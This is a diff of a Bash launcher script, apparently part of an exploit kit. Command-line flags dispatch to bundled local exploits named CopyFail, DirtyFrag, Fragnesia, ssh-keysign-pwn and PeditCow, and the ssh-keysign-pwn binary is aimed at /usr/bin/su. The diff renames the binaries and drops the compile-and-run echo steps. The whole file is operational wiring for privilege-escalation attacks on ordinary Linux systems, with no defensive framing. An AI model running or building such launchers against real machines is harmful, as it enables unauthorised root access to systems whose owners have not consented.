@@ -130,7 +130,7 @@ fi
 
 # Copy-Fail
 if [[ "$*" == "-CFail" ]]; then
-     ${PWD}/exploit/CopyFail/cf
+     ${PWD}/exploit/CopyFail/copyfail
 fi
 
 # Pack2TheRoot 
@@ -140,28 +140,20 @@ fi
 
 # DirtyFrag
 if [[ "$*" == "-DirtyFrag" ]]; then
-     ${PWD}/exploit/DirtyFrag/df
+     ${PWD}/exploit/DirtyFrag/dirtyfrag
 fi
 
 # Fragnesia
 if [[ "$*" == "-Fragnesia" ]]; then
-     ${PWD}/exploit/Fragnesia/fg
+     ${PWD}/exploit/Fragnesia/fragnesia
 fi
 
 # ssh-keysign-pwn
 if [[ "$*" == "-SKP" ]]; then
-     gcc ${PWD}/exploit/ssh-keysign-pwn/exploit_vuln_target.c -o ${PWD}/exploit/ssh-keysign-pwn/skp
-     echo "[+] Compilation successfuly !"
-     echo "[+] PATH=${PWD}/exploit/ssh-keysign-pwn/skp"
-     echo "[+] Executing the binary..."
      ${PWD}/exploit/ssh-keysign-pwn/skp /usr/bin/su
 fi
 
 # PeditCow
 if [[ "$*" == "-PeditCow" ]]; then
-     gcc -O2 -Wall -static ${PWD}/exploit/PeditCow/packet_edit_meme.c ${PWD}/exploit/PeditCow/pedit_primitive.c      
-     echo "[+] Compilation successfuly !"
-     echo "[+] PATH=${PWD}/exploit/PeditCow/a.out"
-     echo "[+] Executing the binary..."
      ${PWD}/exploit/PeditCow/a.out
 fi
